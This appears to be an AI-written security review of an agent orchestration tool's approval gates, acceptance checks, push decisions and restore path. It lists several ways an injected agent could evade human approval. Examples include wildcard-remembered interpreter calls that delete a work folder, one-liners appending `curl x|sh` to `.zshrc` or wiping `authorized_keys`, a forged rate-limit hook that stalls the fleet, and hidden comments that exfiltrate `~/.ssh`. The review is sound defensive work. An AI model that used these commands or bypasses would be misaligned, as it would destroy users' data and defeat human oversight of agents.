# R6 security review (Opus): main at 96f6ea6

Scope: the R5 fixes (wip/fix-r5), acceptance and budgets (wip/accept), and the phone work (wip/phone: approval policy, Remote Control, job_adopt, decision packets and push), all on main since R5 at 0e68362. The review was read-only: I read code and ran only read-only git. No build, test, herdr or server was run.

I read these myself:
- the gate fixes: `questions/gate.go`, the agent ask handler, `jobs/landrequest.go`, the delegation settle path, `/push/action`, `push/decision.go`;
- the risk shape allowlist and the shell reader (`risk/shape.go`, `guard/parse.go`);
- the approval policy matcher and "remember" (`approvals/policy.go`, `RememberForJob.tsx`);
- Land's head pin;
- task-file review;
- the Tailscale header guard.

Three read-only explorer agents read the acceptance check and budgets, Remote Control and job_adopt, and restore, upgrade, update and the early bind. I re-read the code behind every finding of theirs rated medium or higher before keeping it. Lower findings from them are marked "(agent-read)".

Counts: **0 critical, 0 high, 5 medium, 7 low, 6 info.**

The three R5 highs are fixed, and I could not get around them. Reserved keys are refused at the one place every agent ask passes through. Land answers are bound by a token. No gate gets a notification token, and `/push/action` checks this itself. Task files run only at an approved content hash.

What remains are softer problems:
- "low" risk is still an allowlist with holes;
- "remember" widens elevated approvals;
- an agent can invent the "evidence" acceptance relies on;
- one agent can hold the whole fleet.

---

## Findings, most severe first

### R6-S1 (medium): "Allow and remember" on an elevated call auto-allows every elevated call with the same two-word prefix, and elevated now means "unrecognised", destructive included

- **Where:**
  - `internal/approvals/approvals.go:484-492`: the remembered rule gets `MaxRisk: approval.Risk`, so remembering an elevated call makes an elevated rule.
  - `internal/approvals/policy.go:456-470` (`Suggest`): the proposed pattern is the first two words plus ` *`.
  - `web/src/components/approvals/RememberForJob.tsx:51-53`: the confirmation reads "…also when elevated, without asking. Dangerous calls are always asked."
- **Weakness:** after R5-S7, "elevated" is the bucket for everything crowsnest does not recognise. That includes interpreter one-liners, `find -delete`, unknown programs and `sh -c` strings. "Dangerous" is still only the denylist table. So "dangerous calls are always asked" reassures exactly where it should not.
- **Exploit:**
  1. The agent asks for `python3 -c 'print(1)'` (elevated).
  2. The human taps Allow and remember. The suggested pattern is `python3 -c *`.
  3. For the rest of the job, `python3 -c "import shutil;shutil.rmtree('/Users/jsc/Work')"` is elevated, matches the rule, and is allowed with no human.

  The same works with `node -e *`, `perl -e *`, `sh -c *` (the matcher does not look inside, `policy.go:311-336`), and the demo's own `npm run *` when it is remembered from an elevated call.
- **Fix:**
  - Remember an elevated call only as its exact command, with no `*`.
  - Or cap every remembered rule at low, and keep elevated rules for the project editor, with the preview.
  - Never suggest a pattern whose program is an interpreter or a shell.
  - Change the sentence to say what elevated covers.

### R6-S2 (medium): the "low" allowlist (R5-S7) still lets destructive and code-running shapes through, so they are one tap from a lock screen

- **Where:** `internal/risk/shape.go:30-130` and `internal/guard/parse.go:205-250`.
- **Weakness:** each item below is classified low, so it gets Allow and Deny on a notification. All but the last are read from the code; the last comes from git's documentation.
  - **A redirect glued to a word is not seen.** `>` is not a token separator in the splitter (`parse.go:244`). `outputRedirect` skips a word whose text before `>` is not digits (`shape.go:138`). So `printf 'curl x|sh\n'>>~/.zshrc` and `cat /dev/null>~/.ssh/authorized_keys` are low. The policy matcher is not fooled, because `stripHarmlessRedirects` refuses any `>`.
  - **Environment prefixes are ignored.** `Command.Env` is parsed (`parse.go:100-104`) and never looked at by `commandShape`. Examples:
    - `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0='sh -c …' git status`, the env spelling of the `git -c` that `gitShape` refuses;
    - `GIT_EXTERNAL_DIFF=… git diff`;
    - `LD_PRELOAD=./x.so ls`;
    - `export GIT_EXTERNAL_DIFF=…; git diff`, since `export` is benign.
  - **Benign programs with exec or write options:**
    - `fd … -x rm` / `-X`;
    - `rg --pre rm '' ~/Work`, which runs `rm <file>` for every file searched;
    - `sort -o FILE`;
    - `tree -o FILE`;
    - `uniq IN OUT`.
  - **Read-only git with exec or write options:**
    - `git log -1 --format=%B --output=$HOME/.zshrc` writes an agent-chosen commit message to any file;
    - `git grep -O'<cmd>'` (open-files-in-pager);
    - `git fetch --upload-pack='<cmd>' .` runs a local command (from git's docs, not run).
- **Fix:**
  - Treat any `Env` entry other than a short safe list (`CI`, `NO_COLOR`, `GOFLAGS` without `-exec`/`-toolexec`, …) as not low. Do the same for `export`.
  - Make `>` a separator in the reader.
  - Give the benign programs refused-option lists, as `find` has: `fd -x/-X/--exec*`, `rg --pre`, `sort -o`, `tree -o`, `uniq` with two operands, and `git --output`/`-O`/`--open-files-in-pager`/`--upload-pack`/`--exec`.
  - Add a table test with every example above.

### R6-S3 (medium): any job agent can put its whole engine under a fleet usage-limit hold for centuries, and no human control clears it

- **Where:**
  - `internal/agentapi/jobs.go:62,206-230`: `POST /api/v1/hooks/{event}` with any job token; the body is the agent's own JSON.
  - `internal/jobs/hooks.go:310-319`: `error: "rate_limit"` passes `error_details` to `noteLimitLocked`.
  - `internal/jobs/fleetlimit.go:117-128,208-221`: the first report sets the fleet limit, and `ParseLimitReset` reads "try again in N hours" with no upper bound.
  - `fleetlimit.go:313-321`: the only `Clear` is the tick, once the reset has passed. A grep finds no human route that clears it.
- **Exploit:** an injected agent sends `{"error":"rate_limit","error_details":"try again in 2000000 hours"}` to its own hook endpoint. The result:
  - every new start of that engine is queued (`holds.go:66-80`);
  - retries, Stop-hook nudges and backstops wait;
  - standing agents' pokes are held (`accept_wiring.go:91-98`);
  - this survives restarts, because it is stored in kv.

  The human can only use "Start anyway" job by job. Spend written into the agent's own transcript can also trip the fleet daily ceiling (agent-read, likely), but real spend is the same lever.
- **Fix:**
  - Cap a parsed reset at the longest real limit window (about a week), and treat anything larger as a guess.
  - Accept a limit only from the hook relay, not a raw API body. Or require two jobs, or a corroborating transcript line, before holding the fleet.
  - Add a human "clear this limit" action on the banner.

### R6-S4 (medium): acceptance "evidence" is produced by code the agent controls, run on a tree the agent can still change, and DESIGN 6.15 presents it as crowsnest's own

- **Where:**
  - `internal/jobs/accept.go:158-171` (`AutoCheckCommand`) reads `mise.toml` and the others from the **worktree**.
  - `accept.go:174-196`: even a human-set project command runs the worktree's Makefile or package.json.
  - `accept.go:329-363`: the check runs in the live worktree. Afterwards only `Head` is compared, and the dirty state is never checked again.
  - The Land gate trusts "accepted" (`jobs/land.go:337-345`).
- **Weakness:**
  - A builder commits `[tasks.check] run = "true"` (or weakens tests) and calls done. The result is **accepted**, and Land enables without an override.
  - A repository with no check task can be flipped from "unverified" to "accepted" by adding one.
  - A background process the agent left running can swap in uncommitted edits while the check runs, then restore them. The pass is still recorded against commit X.
  - The accept report's "known gaps" mentions the first point. DESIGN 6.15 does not; it calls the check "crowsnest's evidence, not the agent's word".
- **Fix:**
  - Run the check in a fresh detached worktree at the pinned SHA (`git worktree add --detach <tmp> <sha>`), not in the agent's tree.
  - Read the check definition from the base commit.
  - Mark evidence "check definition changed on this branch" when `mise.toml`, the Makefile or the scripts changed, and require the override then.
  - Say all this in 6.15.
- Related, low (agent-read, confirmed by reading `accept.go:162`): `os.ReadFile` follows a committed `mise.toml` symlink to `/dev/zero` or a FIFO. A committed symlink still counts as a clean tree, so crowsnest OOMs or hangs in `done`. Use `Lstat`, regular files only, and a size cap.

### R6-S5 (medium for a foreign backup, low for your own): restore installs auto-allow approval rules and "already read" role hashes, and keeps unscrubbed databases forever

- **Where:**
  - `internal/backup/restore.go:446-469` (`markRestored`): pauses, records the restore and clears `task_reviews` only. A grep of `internal/backup` finds nothing for `approval_rules` or `instructions.file-seen`.
  - `move.commit` in `restore.go`: the replaced database (and its `-wal` and `-shm`) is kept as `.before-restore-<stamp>`, and nothing removes it (agent-read).
- **Weakness:** this is R5-S9 with two new payloads.
  - A crafted backup brings live project **approval rules**, including elevated `bash` globs, which allow calls silently once the human resumes.
  - It also brings `instructions.file-seen.<role>` hashes that match the role files it ships, so R5-S14's "changed, review" badge never shows.
  - The kept `.before-restore-*` files are full unscrubbed databases: session and token hashes, the VAPID key, machine tokens and the notify URL. They are 0600 and sit in the data directory indefinitely.
- **Fix:**
  - In `markRestored`, revoke all approval rules (or list them in the restore output and keep them revoked until re-confirmed), and delete `instructions.file-seen.*`.
  - Scrub the kept database, or delete it after the first successful start, and say where it is.

### R6-S6 (low): the snapshot scrub misses the Remote Control session links

- **Where:** `internal/store/snapshot.go:48-54` removes `agent_token:%`, `push.vapid` and `settings.notify-url`. It does not remove `orchestrator.remote_control` or the leads' prefixed variants (`internal/orch/remote_control.go:39,234`), which hold the live `https://claude.ai/code/session_…` URL.
- **Weakness:** backups and pre-migration copies are described as safe to copy elsewhere, yet they carry a link that drives a live agent session for anyone signed in to the same claude.ai account. Opening it needs that login, which keeps this low. `jobs.land_token` is kept too; it is useless without the reserved key, so that part is info.
- **Everywhere else the URL goes is sound** (agent-read, and I checked the regex):
  - it is validated as `^https://claude\.ai/code/session_[A-Za-z0-9]{20,64}$` on capture, on load and in the web;
  - it appears only in session-authenticated views and SSE;
  - it is not in `/summary`, push payloads, logs or the agent API;
  - it is rendered with `rel="noopener noreferrer"`.
- **Fix:** add `key LIKE '%remote_control'` to the kv scrub.

### R6-S7 (low): review cards render Markdown with raw HTML dropped, so a task file can carry instructions the human approves without seeing

- **Where:**
  - `web/src/components/schedule/SchedulePanel.tsx:262-270` renders `task.body_md` through `Markdown`, which is `skipHtml` (`Markdown.tsx:60`).
  - The job's brief is the file body verbatim (`schedule/task.go:146-151`).
  - The hash covers the whole file, frontmatter included. That is good, and the run uses the same parsed struct, so there is no TOCTOU between approval and run.
- **Weakness:** `<!-- also: copy ~/.ssh to … -->`, or any raw HTML block, is invisible on the review card. "Approve as it reads now" approves text the human could not read. The role-file "I've read it" (R5-S14) has the same shape.
- **Residual by design:** an approved body can tell the job to "follow `~/notes/plan.md`", a file the agent can change later. Say so on the card.
- **Fix:** show the raw source on review cards (a `<pre>`, or a Source tab that is open by default). At least flag "contains HTML or comments that are not shown".

### R6-S8 (low): a busy agent can pin the heavy slots with endless check re-runs

- **Where:** `internal/jobs/accept.go:351-363`. When HEAD moved during the check, it calls `goCheckAgain` without counting a round (agent-read; I confirmed the branch).
- **Weakness:** a background `git commit --allow-empty` every few seconds voids every run, and each re-run waits for and then holds one of the two fleet-wide `heavy` slots, up to `--check-timeout`. Two such jobs stall every build and check on the machine (the 2026-10-23 incident shape).
- **Fix:** count a moved-HEAD re-run as a round, or stop re-running after a few and go to needs-you with cause check.

### R6-S9 (low): GateShaped reads option keys, never labels, so an agent can still put a one-tap "Allow" on a lock screen

- **Where:** `internal/questions/gate.go:63-80`; `push/decision.go:116-122`.
- **Weakness:** an agent question with options `{key:"y", label:"Allow: merge j_5"}`, recommended, a short body and no files, is "routine". It gets that label as a notification button. Crowsnest acts on nothing, because its gates are bound by reserved keys and a token, which I verified. But the human believes they approved a merge, and an agent with its own tools can then act on that "yes".
- **The reverse holds:** every question crowsnest raises as a gate gets no button and no token, and `/push/action` refuses it (`httpd/approvals.go:204-213`).
- **Fix:** also treat a question as gate-shaped when any option *label* or the title starts with or contains allow, approve, merge, land, push, deploy, delete or grant. Cheap, and it closes R3-I4's spirit.

### R6-S10 (low): the Remote Control link can be pointed at another session by text in the pane

(agent-read; I checked `remote_url.go:31,52`.)

- **Where:** `internal/orch/remote_control.go`, at the pane read. The newest regex match since the last "Claude Code v" header wins, and the URL is not required to sit next to the banner.
- **Weakness:** before the first capture, an injected standing agent can print `https://claude.ai/code/session_<attacker's>`, which can be a session on the attacker's own account. "Open in Claude" then goes there. It cannot leave claude.ai.
- **Fix:** prefer the transcript's `bridge_status` over the screen. Take a screen match only on the line after the banner, and never replace a transcript-sourced URL with a screen one.

### R6-S11 (low): an agent's land request can lose its head pin, and `job_adopt` jobs are labelled as human work

- **Where (head pin):** `internal/jobs/landrequest.go:66-70`, `head, _ = landing.Head(...)`. On an error the request is stored with no head, and `LandWith` skips the pin when `Head == ""` (`land.go:327`). It needs an unreadable worktree at request time, so this is narrow. Refuse the request instead.
- **Where (adopt, agent-read):** `internal/jobs/adopt.go:30-75`. `Origin` is never set, so the row is `OriginHuman`. It has no directory, launch, worktree or land rights, so no privilege follows. But the board and pokes treat it as the human's, and its brief is agent text. Set the origin to the standing agent's.

### R6-S12 (low): check environment and output-file details

(agent-read; I checked `checkEnv` at `accept.go:418-431`.)

- **Environment:** `checkEnv` drops `HERDR_*`, `CROWSNEST_TOKEN`, `CROWSNEST_JOB` and `CLAUDECODE` only, and keeps `CROWSNEST_SOCKET`, `CROWSNEST_SESSION` and anything else the operator exported (for example `GH_TOKEN`). serve's own secrets are already gone (`UnsetSecretEnv`), so this is defence in depth: use `herdr.ScrubEnv` plus the above.
- **Escape from the kill:** a `setsid` grandchild survives the process-group kill.
- **Output file:** `check-<id>.txt` is written with `os.WriteFile`, which follows a symlink the agent pre-created. It is same uid, so no new privilege.
- **Output rendering is sound:** a React text node, 8 KB stored, 256 KB file.

### Info

- **R6-I1:** the fix report says `land_*` and `task_*` prefixes are reserved. The code reserves an exact list (`gate.go:43-47`). That is sound today, because every settle reads only listed keys. Make it a prefix rule, as the report describes, so a future `land_head` is safe by default.
- **R6-I2:** `push/watcher.go:181` detects a cut summary with `HasSuffix(summary, "…")`, but `Summary` now ends "… (N more characters)". It is masked today, because a summary over 160 runes is never low. Use a returned flag instead.
- **R6-I3:** an agent can read its own land question's `land_token` (`GET /api/v1/questions/{id}`). That is harmless, because it cannot set the key, and it can only cancel its own question, which drops the request.
- **R6-I4:** edit rules (`insideRule`, `policy.go:433-441`) do not resolve symlinks, while the risk check does (`risk.go:423-444`). An *elevated* edit rule plus an existing symlink inside the tree can therefore auto-allow a write outside it. Resolve in `insideRule` too.
- **R6-I5:** the early bind is sound (agent-read). Nothing is accepted before `Run`, and the setup decision is made before the bind. A queued client simply waits; there is no fd cost before accept.
- **R6-I6:** the self-update tag binding is correct (agent-read; `QuoteMeta`, anchored, issuer pinned). Replaying an older genuinely signed release relies on the `Newer()` check, which was not traced.

---

## Verdicts on R5

| ID | Verdict | Evidence |
|---|---|---|
| S1 agent approves its own land | **Fixed** | `CheckAgentContext` (`gate.go:85-97`, case- and space-insensitive) at `agentapi/server.go:336`, the one route the CLI and the MCP tool use. Crowsnest's own asks go through `AskHuman` only (`delegate.go:501`, `landrequest.go:75`). The web has no question-create route. Land is bound by a 128-bit token, with compare-and-consume under the jobs lock (`landrequest.go:212-237`). `mayRequestLand` (`:87-105`). `relinkApproval`'s crash window is closed by the same reservation. Nested context is impossible, since it is `map[string]string`. `job_create`, `job_adopt` and files carry no question context. |
| S2 gate answered from lock screen | **Fixed** | No token for gates (`decision.go:118-120`), and `/push/action` refuses on the stored context and options (`approvals.go:204-213`). Residual: R6-S9 (labels). |
| S3 task files start jobs | **Fixed** | `review.go`: the hash covers the whole file, the same parsed struct runs, approval needs the shown hash, and a restore clears approvals. Residuals: R6-S7 (hidden HTML), indirection to other files, and orchestrator poke files not reviewed (by design). |
| S4 land not pinned | **Fixed** | `expected_head` required (`httpd/landing.go:139`); merge and push of the SHA (`land.go:327-333`, `landRemote`). Residual: R6-S11. The branch is not frozen; a changed branch is refused instead. |
| S5 repo-controlled git config on Land | **Fixed for landing** | `-c core.hooksPath=/dev/null …` plus `--no-textconv`, per the report and DESIGN 4.22. Merge drivers and clean/smudge filters still run, and so does acceptance's `git status` in the agent's worktree (agent-read). This is documented. |
| S6 Tailscale and another loopback proxy | **Partly** | Refuses requests with Cloudflare or `Forwarded` headers (`ops.go:371-399`), and refuses a start with a `cf-connecting-ip` header config. The limit is documented. |
| S7 low means "no denylist hit" | **Partly** | It is now an allowlist, but R6-S2. Summary cut and bidi are handled (`approvals.go:773-788`). |
| S8 pre-migration copies unscrubbed | **Fixed** | Private temp dir, scrub, then rename (agent-read). Same scrub gap as R6-S6. |
| S9 restore installs anything | **Partly** | Total and entry caps are enforced while streaming (agent-read). There is no confirmation prompt and no defensive mode. R6-S5. |
| S10 release chain | **Fixed in code** | Image signed by digest, provenance, ignore-scripts, SAN bound to the tag (agent-read). Protected `v*` tags and an Environment reviewer are still Jeff's GitHub settings. |
| S11 handoff id on argv | **Documented only** | DESIGN 3.3: `--open never` on multi-user hosts. |
| S12 thumbnails and quota | **Partly** | 16 MP cap, thumbnailing outside the lock (per the report, not re-read). No per-token byte rate. |
| S13 push and machines guards | **Partly** | `sw.js` and `publicAddress` fixed (per the report). Machines to a private IP over https kept on purpose. |
| S14 role files outrank the app | **Fixed (flag only)** | Hash and an "I've read it" badge. It still applies until read. Restore bypass: R6-S5. |
| I1 config login swap | Not done | |
| I2 PHC memory bound | Fixed (per the report) | |
| I3 diagnostics MagicDNS | Not done | |
| I4 push device journalled | Fixed (per the report, not re-read) | |
| I5 custom risk rules win | Unchanged | It now also feeds the policy: a `risk.yaml` that marks a call low makes it eligible for low rules. |

## Checked and found sound

- **Approval policy:**
  - rules are written only through session routes (`httpd/approval_rules.go:49-53`), and no agent API verb touches them;
  - a dangerous call never matches;
  - job rules apply only while the job is live and are keyed by job id, so they do not survive pane reuse or reach another job;
  - compound commands need every simple command to match;
  - `$(`, backticks, process substitution, `eval`, bidi and any file redirect never match (`policy.go:311-336`);
  - env-prefixed spellings do not match a `git *` rule, because the words start with the assignment;
  - `*` alone is refused;
  - edit patterns refuse absolute paths, `~` and `..`.
- **Push and the decision packet:**
  - elevated and dangerous approvals carry no token, not even Snooze;
  - a low approval gets Allow only when the whole body fits;
  - the deep link is `QueryEscape`d and only fetches; I found no open redirect;
  - the project and the kind in the title are crowsnest's words, and only the body carries agent text.
- **Budgets:** raising, finish-step and wake are session-only. `humanOnlyCause` stops an agent lifting budget, check, review or question holds. `until_job` affects only the caller's own job (agent-read, confirmed by reading `protocol.go:383-389`).
- **The check command:** an argv slice with no interpolation; a process-group kill with `WaitDelay`; bounded output; text rendering.
- **Remote Control:** its exposure; see R6-S6.

## Not reviewed

- **No live checks.** That covers git `--upload-pack` and `-O` behaviour (R6-S2), claude.ai's handling of a foreign session id (R6-S10), and real hook payloads for StopFailure.
- Beyond what the findings touch: the spinning detector, waits and receipts, the voice job and rescue panels, and DESIGN 23 in full.
- Whether the decision note in localStorage is cleared on sign-out.
- R3-L2 and L3, still.

## Overall judgement

On a tailnet with a password, main is safe to run today: the network side is unchanged and sound, and the three R5 gate bypasses are closed in a way I could not route around. In the devbox behind a tunnel, it is acceptable on R5's conditions (Cloudflare Access in front, `--tailscale-auth` off). Accept that "accepted" means "the branch's own check passed", not independent evidence. Before the next release tag, fix R6-S1 (no wildcard remembering of elevated calls) and R6-S3 (cap the parsed reset and add a human clear), and close the concrete holes in R6-S2. R6-S4 (run the check at the pinned SHA in a clean tree, and say what it proves) and R6-S5 (clear rules and seen-hashes on restore) should follow in the same release.
